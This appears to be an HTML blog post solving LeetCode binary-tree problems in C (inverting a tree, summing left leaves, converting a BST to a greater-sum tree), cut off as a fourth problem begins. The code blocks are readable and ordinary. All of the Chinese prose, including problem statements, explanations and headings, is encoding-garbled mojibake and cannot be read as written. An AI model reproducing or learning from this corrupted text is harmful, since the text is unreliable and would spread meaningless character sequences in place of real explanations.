ï¼š</p><p>è°·æ­Œï¼šæˆ‘ä»¬90ï¼…çš„å·¥ç¨‹å¸ˆä½¿ç”¨æ‚¨ç¼–å†™çš„è½¯ä»¶(Homebrew)ï¼Œä½†æ˜¯æ‚¨å´æ— æ³•åœ¨é¢è¯•æ—¶åœ¨ç™½æ¿ä¸Šå†™å‡ºç¿»è½¬äºŒå‰æ ‘è¿™é“é¢˜ï¼Œè¿™å¤ªç³Ÿç³•äº†ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/invert-binary-tree">https://leetcode-cn.com/problems/invert-binary-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šè¯¥é¢˜ä¸º2020.9.16çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><p>å¾ˆå¸¸è§„çš„ä¹Ÿå¾ˆç®€å•çš„ä¸€é“é¢˜ç›®ï¼Œåªéœ€<strong>é€å±‚äº¤æ¢å·¦å³èŠ‚ç‚¹</strong>å³å¯ï¼ˆ<del>homebrewçš„å¼€å‘è€…å±…ç„¶å†™ä¸å‡ºè¿™ä¸ªé¢˜ä¹ˆ</del>ï¼ˆ<del>ä¼°è®¡æ˜¯å¤ªç´§å¼ le</del>ï¼ˆ<del>ğŸ‘ˆä¸è¦åœ¨æ„è¿™å®¶ä¼™å¤©å¤©ä¹±è®²</del></p><h3 id="è§£æ³•ä¸€ï¼šé€’å½’"><a href="#è§£æ³•ä¸€ï¼šé€’å½’" class="headerlink" title="è§£æ³•ä¸€ï¼šé€’å½’"></a>è§£æ³•ä¸€ï¼šé€’å½’</h3><p>ä¸€å±‚ä¸€å±‚äº¤æ¢ç»“ç‚¹çš„åšæ³•ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å°±æƒ³åˆ°é€’å½’ï¼Œæ•…æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TreeNode</span>* <span class="built_in">invertTree</span>(<span class="keyword">struct</span> TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TreeNode</span> * temp;</span><br><span class="line">    temp = root-&gt;left;</span><br><span class="line">    root-&gt;left = root-&gt;right;</span><br><span class="line">    root-&gt;right = temp;</span><br><span class="line">    <span class="built_in">invertTree</span>(root-&gt;left);</span><br><span class="line">    <span class="built_in">invertTree</span>(root-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œé€’å½’è°ƒç”¨ä¼šå ç”¨å¤§é‡çš„æ ˆç©ºé—´ï¼ˆæ¯æ¬¡è¿›è¡Œå‡½æ•°è°ƒç”¨éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼‰ï¼Œæ‰€ä»¥ç©ºé—´å¤æ‚åº¦ä¸Šä¸æ˜¯å¾ˆå¥½çœ‹ï¼ˆ</p><p><img src="https://i.loli.net/2020/09/16/PaIkMX54n7zH1bJ.png" alt="image.png"></p><h3 id="è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆé˜Ÿåˆ—ï¼‰"><a href="#è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆé˜Ÿåˆ—ï¼‰" class="headerlink" title="è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆé˜Ÿåˆ—ï¼‰"></a>è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆé˜Ÿåˆ—ï¼‰</h3><p>å¤§æ¦‚è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>å¤´ç»“ç‚¹å…¥é˜Ÿ</li><li>äº¤æ¢å·¦å³ç»“ç‚¹</li><li>å·¦å³ç»“ç‚¹å…¥é˜Ÿ</li><li>å¤´ç»“ç‚¹å‡ºé˜Ÿ</li></ul><p>é˜Ÿåˆ—ä¸ºç©ºæ—¶åœæ­¢å³å¯</p><p>å› ä¸ºæ•°æ®èŒƒå›´ä¸åƒOIé‚£ä¹ˆå˜æ€ï¼ˆxï¼‰ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ä¸€ä¸ªå¾ˆå°çš„æ•°ç»„æ¥å‚¨å­˜å³å¯</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TreeNode</span>* <span class="built_in">invertTree</span>(<span class="keyword">struct</span> TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="type">int</span> start=<span class="number">0</span>, end=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TreeNode</span> * (queue[<span class="number">1000</span>]), *temp;</span><br><span class="line">    queue[start] = root;</span><br><span class="line">    <span class="keyword">while</span>(start!=end)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(queue[start] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = queue[start]-&gt;left;</span><br><span class="line">            queue[start]-&gt;left = queue[start]-&gt;right;</span><br><span class="line">            queue[start]-&gt;right = temp;</span><br><span class="line">            queue[end] = queue[start]-&gt;left;</span><br><span class="line">            queue[end+<span class="number">1</span>] = queue[start]-&gt;right;</span><br><span class="line">            end += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        start++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/16/Y68GBXM2hlSKgzs.png" alt="image.png"></p><blockquote><p>ä»¥åŠè¿™ä¸ªæ•…äº‹å®åœ¨æ˜¯å¤ªæäº†</p><p><img src="https://i.loli.net/2020/09/16/NW26F4OInxfqbmy.png" alt="image.png"></p></blockquote><h2 id="0x02-å·¦å¶å­ä¹‹å’Œ"><a href="#0x02-å·¦å¶å­ä¹‹å’Œ" class="headerlink" title="0x02. å·¦å¶å­ä¹‹å’Œ"></a>0x02.<a href="https://leetcode-cn.com/problems/sum-of-left-leaves/"> å·¦å¶å­ä¹‹å’Œ</a></h2><blockquote><p>è®¡ç®—ç»™å®šäºŒå‰æ ‘çš„æ‰€æœ‰å·¦å¶å­ä¹‹å’Œã€‚</p><p>ç¤ºä¾‹ï¼š</p><p> 3<br>&#x2F; \<br>9  20<br>     &#x2F; \<br>   15   7</p><p>åœ¨è¿™ä¸ªäºŒå‰æ ‘ä¸­ï¼Œæœ‰ä¸¤ä¸ªå·¦å¶å­ï¼Œåˆ†åˆ«æ˜¯ 9 å’Œ 15ï¼Œæ‰€ä»¥è¿”å› 24</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/sum-of-left-leaves">https://leetcode-cn.com/problems/sum-of-left-leaves</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h3 id="è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"><a href="#è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" class="headerlink" title="è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h3><p>ä¸€å±‚ä¸€å±‚åœ°æœä¸‹å»ï¼Œè‹¥å·¦ç»“ç‚¹ä¸ºå¶å­ç»“ç‚¹ï¼ˆæ— å­å¥³ï¼‰åˆ™åŠ ä¸Šå·¦ç»“ç‚¹çš„å€¼ï¼Œå¦åˆ™æœç´¢å­ç»“ç‚¹ï¼Œè‹¥å³ç»“ç‚¹ä¸ä¸ºå­ç»“ç‚¹åˆ™æœç´¢å³ç»“ç‚¹çš„å­èŠ‚ç‚¹</p><p>å¾—ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeaf</span><span class="params">(<span class="keyword">struct</span> TreeNode * root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> !root-&gt;left &amp;&amp; !root-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    ans += root-&gt;left ? (isLeaf(root-&gt;left) ? root-&gt;left-&gt;val : dfs(root-&gt;left)) : <span class="number">0</span>;</span><br><span class="line">    ans += (root-&gt;right!=<span class="literal">NULL</span>&amp;&amp;!isLeaf(root-&gt;right)) ? dfs(root-&gt;right) : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> root ? dfs(root) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ©ç”¨ä¸‰ç›®è¿ç®—ç¬¦çš„ä¸€è¡Œæµ</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> root ? (root-&gt;left &amp;&amp; !root-&gt;left-&gt;left &amp;&amp; !root-&gt;left-&gt;right ? root-&gt;left-&gt;val + sumOfLeftLeaves(root-&gt;right) : sumOfLeftLeaves(root-&gt;left)+sumOfLeftLeaves(root-&gt;right)) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/19/aIl9nXHm8vPQ6ZL.png" alt="image.png"></p><h3 id="è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰-é˜Ÿåˆ—"><a href="#è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰-é˜Ÿåˆ—" class="headerlink" title="è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰+ é˜Ÿåˆ—"></a>è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰+ é˜Ÿåˆ—</h3><p>è¿™ä¸ªè§£æ³•æ˜¯ä»å®˜æ–¹çš„é¢˜è§£ä¸Šçœ‹æ¥çš„</p><p>ä½¿ç”¨é˜Ÿåˆ—æ•°æ®ç»“æ„æ¥å®ç°å¹¿åº¦ä¼˜å…ˆæœç´¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeafNode</span><span class="params">(<span class="keyword">struct</span> TreeNode *node)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> !node-&gt;left &amp;&amp; !node-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(<span class="keyword">struct</span> TreeNode *root)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> **<span class="title">q</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode *) * <span class="number">1001</span>);</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    q[right++] = root;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">node</span> =</span> q[left++];</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeafNode(node-&gt;left)) </span><br><span class="line">            &#123;</span><br><span class="line">                ans += node-&gt;left-&gt;val;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                q[right++] = node-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isLeafNode(node-&gt;right)) </span><br><span class="line">            &#123;</span><br><span class="line">                q[right++] = node-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿™ä¹ˆåšæœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯éœ€è¦æå‰å¼€è¾Ÿè¾ƒå¤§çš„ç©ºé—´</p><p><img src="https://i.loli.net/2020/09/19/MSdXJub9jvfs6Ge.png" alt="image.png"></p><h2 id="0x03-æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘"><a href="#0x03-æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘" class="headerlink" title="0x03.æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘"></a>0x03.<a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/">æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æœç´¢æ ‘ï¼ˆBinary Search Treeï¼‰ï¼ŒæŠŠå®ƒè½¬æ¢æˆä¸ºç´¯åŠ æ ‘ï¼ˆGreater Tree)ï¼Œä½¿å¾—æ¯ä¸ªèŠ‚ç‚¹çš„å€¼æ˜¯åŸæ¥çš„èŠ‚ç‚¹å€¼åŠ ä¸Šæ‰€æœ‰å¤§äºå®ƒçš„èŠ‚ç‚¹å€¼ä¹‹å’Œã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>è¾“å…¥: åŸå§‹äºŒå‰æœç´¢æ ‘:<br>              5<br>            &#x2F;   <br>           2     13</p><p>è¾“å‡º: è½¬æ¢ä¸ºç´¯åŠ æ ‘:<br>             18<br>            &#x2F;   <br>          20     13</p><p>æ³¨æ„ï¼šæœ¬é¢˜å’Œ 1038: <a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/">https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/</a> ç›¸åŒ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree">https://leetcode-cn.com/problems/convert-bst-to-greater-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šè¯¥é¢˜ä¸º2020.9.21çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><p><strong>äºŒå‰æœç´¢æ ‘</strong>æœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯<strong>ç»“ç‚¹å·¦å­æ ‘çš„ç»“ç‚¹éƒ½æ¯”è¯¥ç»“ç‚¹å°ï¼Œå³å­æ ‘çš„ç»“ç‚¹éƒ½æ¯”è¯¥ç»“ç‚¹å¤§</strong>ï¼Œå› è€Œå«äºŒå‰æœç´¢æ ‘ï¼Œå¯ä»¥ç”¨ä»¥å¤§å¹…ç¼©çŸ­æœç´¢çš„æ—¶é—´</p><h3 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ååºä¸­åºéå†"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ååºä¸­åºéå†" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ååºä¸­åºéå†"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ååºä¸­åºéå†</h3><p>ç”±äºäºŒå‰æŸ¥æ‰¾æ ‘çš„è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬è€ƒè™‘<strong>é€’å½’å®ç°çš„æ·±åº¦ä¼˜å…ˆæœç´¢</strong>ç®—æ³•ï¼Œé€šè¿‡<strong>ååºä¸­åºéå†</strong>æ¥å®ç°ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li><strong>éå†å³å­æ ‘ï¼Œå°†å³å­æ ‘ç»“ç‚¹å€¼åŠ åˆ°summary</strong></li><li><strong>å°†å½“å‰ç»“ç‚¹å€¼åŠ åˆ°summary</strong></li><li><strong>å°†å½“å‰ç»“ç‚¹å€¼ç½®ä¸ºsummary</strong></li><li><strong>éå†å·¦å­æ ‘</strong></li></ul><p>æ¯ä¸ªç»“ç‚¹éœ€è¦ä¸€ä¸ªé¢å¤–çš„æ ˆç©ºé—´ï¼Œå› è€Œç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)ï¼›éœ€è¦éå†æ¯ä¸ªç»“ç‚¹ä¸€æ¬¡ï¼Œå› è€Œæ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> *sum)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;right,sum);</span><br><span class="line">    *sum+=root-&gt;val;</span><br><span class="line">    root-&gt;val=*sum;</span><br><span class="line">    dfs(root-&gt;left,sum);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">convertBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    dfs(root, &amp;sum);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/hJQADZUcMlypLYn.png" alt="image.png"></p><h2 id="0x04-åˆå¹¶äºŒå‰æ ‘"><a href="#0x04-åˆå¹¶äºŒå‰æ ‘" class="headerlink" title="0x04. åˆå¹¶äºŒå‰æ ‘"></a>0x04. <a href="https://leetcode-cn.com/problems/merge-two-binary-trees/">åˆå¹¶äºŒå‰æ ‘</a></h2><blockquote><p>ç»™å®šä¸¤ä¸ªäºŒå‰æ ‘ï¼Œæƒ³è±¡å½“ä½ å°†å®ƒä»¬ä¸­çš„ä¸€ä¸ªè¦†ç›–åˆ°å¦ä¸€ä¸ªä¸Šæ—¶ï¼Œä¸¤ä¸ªäºŒå‰æ ‘çš„ä¸€äº›èŠ‚ç‚¹ä¾¿ä¼šé‡å ã€‚</p><p>ä½ éœ€è¦å°†ä»–ä»¬åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„äºŒå‰æ ‘ã€‚åˆå¹¶çš„è§„åˆ™æ˜¯å¦‚æœä¸¤ä¸ªèŠ‚ç‚¹é‡å ï¼Œé‚£ä¹ˆå°†ä»–ä»¬çš„å€¼ç›¸åŠ ä½œä¸ºèŠ‚ç‚¹åˆå¹¶åçš„æ–°å€¼ï¼Œå¦åˆ™ä¸ä¸º NULL çš„èŠ‚ç‚¹å°†ç›´æ¥ä½œä¸ºæ–°äºŒå‰æ ‘çš„èŠ‚ç‚¹ã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥:<br>    Tree 1                     Tree 2<br>          1                         2<br>         &#x2F; \                       &#x2F; \<br>        3   2                     1   3<br>       &#x2F;                             \   \<br>      5                             4   7<br>è¾“å‡º:<br>åˆå¹¶åçš„æ ‘:<br>         3<br>        &#x2F; \<br>       4   5<br>      &#x2F; \   \<br>     5   4   7<br>æ³¨æ„: åˆå¹¶å¿…é¡»ä»ä¸¤ä¸ªæ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/merge-two-binary-trees">https://leetcode-cn.com/problems/merge-two-binary-trees</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šæœ¬é¢˜ä¸º2020.9.23çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><h3 